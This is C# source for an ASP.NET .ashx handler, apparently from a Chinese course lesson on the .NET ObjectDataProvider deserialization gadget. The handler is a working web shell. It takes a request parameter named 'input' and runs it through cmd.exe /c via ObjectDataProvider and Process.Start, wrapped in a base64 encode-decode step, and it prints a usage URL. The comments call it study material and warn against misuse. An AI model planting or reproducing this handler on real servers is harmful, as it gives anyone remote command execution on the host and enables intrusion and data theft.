<%@ WebHandler Language="C#" Class="ObjectDataProviderSpy" %>
<%@ Assembly Name="PresentationFramework,Version=4.0.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35" %>
<%@ Assembly Name="WindowsBase,Version=4.0.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35" %>
using System;
using System.Web;
using System.Text;
using System.Windows.Data;

/// <summary>
/// 注意：本程序仅供实验学习 ObjectDataProvider类，请勿违法滥用！
/// 来源自.NET高级代码审计反序列化漏洞第12课 Gadget：ObjectDataProvider
/// 链接：https://mp.weixin.qq.com/s/sHKR0zlW2CsphGAmv3_KVA
/// </summary>
public partial class ObjectDataProviderSpy : IHttpHandler
{
    public bool IsReusable
    {
        get { return false; }
    }
    public static string EncodeBase64(string code_type, string code)
    {
        string encode = "";
        byte[] bytes = Encoding.GetEncoding(code_type).GetBytes(code);
        try
        {
            encode = Convert.ToBase64String(bytes);
        }
        catch
        {
            encode = code;
        }
        return encode;
    }
    public static string DecodeBase64(string code_type, string code)
    {
        string decode = "";
        byte[] bytes = Convert.FromBase64String(code);
        try
        {
            decode = Encoding.GetEncoding(code_type).GetString(bytes);
        }
        catch
        {
            decode = code;
        }
        return decode;
    }

    public static void CodeInject(string input)
    {
        string ExecCode = EncodeBase64("utf-8", input);
        ObjectDataProvider objectDataProvider = new ObjectDataProvider()
        {
            ObjectInstance = new System.Diagnostics.Process(),
        };
        objectDataProvider.MethodParameters.Add("cmd.exe");
        objectDataProvider.MethodParameters.Add("/c " + DecodeBase64("utf-8",ExecCode));
        objectDataProvider.MethodName = "Start";
    }

    public void ProcessRequest(HttpContext context)
    {
        context.Response.ContentType = "text/plain";
        if (!string.IsNullOrEmpty(context.Request["input"]))
        {
            CodeInject(context.Request["input"]);
            context.Response.Write("Status: 执行完毕！");
        }
        else
        {
            context.Response.Write("1. example: http://www.xxxxxxx.com/ObjectDataProviderSpy.ashx?input=calc.exe\n\n");
            context.Response.Write("2. 程序调用cmd.exe/c calc.exe 执行命令，注意：本程序仅供实验学习 ObjectDataProvider类，请勿违法滥用！");
        }
    }
}